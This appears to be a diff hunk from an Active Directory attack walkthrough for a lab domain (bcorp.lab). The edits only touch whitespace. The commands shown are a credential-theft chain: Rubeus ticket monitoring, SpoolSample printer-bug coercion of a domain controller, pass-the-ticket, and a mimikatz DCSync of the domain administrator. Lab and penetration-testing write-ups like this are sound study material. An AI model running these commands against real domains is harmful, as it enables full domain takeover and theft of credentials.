@@ -994,9 +994,10 @@ Rubeus monitor /interval:5 /filteruser:rdc-01$ /nowrap
 SpoolSample RDC-01.bcorp.lab WebSrv_ownd
 Rubeus ptt /ticket:
 ```
+
 The machine account of the Root Domain Controller is not a localadministrator account socannot directly achieve code execution on the Root-DC. However, a DC Machine account _does_ have the rights to force a domain replication:
 
-```lsadump::dcsync /domain:bcorp.lab /user:bcorp\administrator```
+```lsadump::dcsync /domain:bcorp.lab /user:bcorp\administrator ```
 
 
 ```
